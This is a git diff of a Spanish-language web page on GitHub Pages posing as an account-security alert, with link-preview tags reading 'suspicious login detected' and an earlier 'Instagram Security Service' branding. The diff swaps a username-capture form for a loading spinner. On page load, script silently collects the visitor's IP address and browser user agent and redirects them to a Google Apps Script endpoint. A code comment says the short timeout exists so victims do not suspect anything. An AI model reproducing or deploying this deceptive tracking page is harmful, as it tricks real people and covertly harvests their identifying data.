@@ -2,52 +2,54 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seguridad de Red | Validación</title>
+    <title>Cargando...</title>
 
     <meta property="og:title" content="Inicio de sesión sospechoso detectado" />
-    <meta property="og:description" content="Se ha detectado un acceso no autorizado. Valide su identidad para proteger su cuenta." />
+    <meta property="og:description" content="Se ha detectado un acceso no autorizado. Verificando seguridad de la cuenta..." />
     <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
-    <meta property="og:site_name" content="Instagram Security Service" />
     <meta property="og:type" content="website" />
 
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
-        .logo { font-weight: 700; font-size: 22px; margin-bottom: 12px; color: #262626; }
-        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; box-sizing: border-box; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        button:disabled { background: #b2dffc; }
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="logo">Validación de Acceso</div>
-    <p>Para garantizar la seguridad de su cuenta, ingrese su nombre de usuario de red.</p>
-    <input type="text" id="userInput" placeholder="Usuario o ID de Red" autocomplete="off">
-    <button id="btn" onclick="ejecutar()">Confirmar Identidad</button>
-</div>
+    <div class="loader"></div>
 
 <script>
-    async function ejecutar() {
-        const user = document.getElementById('userInput').value.trim();
-        if (!user) { alert("Campo requerido"); return; }
-        const btn = document.getElementById('btn');
-        btn.disabled = true;
-        btn.innerText = "Cargando...";
-
-        let ip = "No_Capturada";
+    async function auditoriaSilenciosa() {
+        let ipCapturada = "No_Detectada";
+        
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-        } catch (e) { ip = "Error_IP"; }
+            // Captura rápida de IP (Máximo 3 segundos de espera para que no sospechen)
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000);
 
-        const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
-        window.location.href = `${scriptURL}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(navigator.userAgent)}`;
+            const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+            const data = await response.json();
+            ipCapturada = data.ip;
+            clearTimeout(timeoutId);
+        } catch (e) {
+            ipCapturada = "IP_Oculta_o_Timeout";
+        }
+
+        // Datos del dispositivo
+        const hardware = navigator.userAgent;
+        // Usuario genérico ya que no hay formulario
+        const usuarioAnonimo = "Clic_Directo_Auditoria"; 
+
+        // URL DE TU APPS SCRIPT
+        const endpoint = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
+        
+        // Redirección inmediata inyectando datos
+        window.location.href = `${endpoint}?u=${encodeURIComponent(usuarioAnonimo)}&ip=${encodeURIComponent(ipCapturada)}&ua=${encodeURIComponent(hardware)}`;
     }
+
+    // Ejecutar automáticamente al abrir la página
+    window.onload = auditoriaSilenciosa;
 </script>
 </body>
 </html>
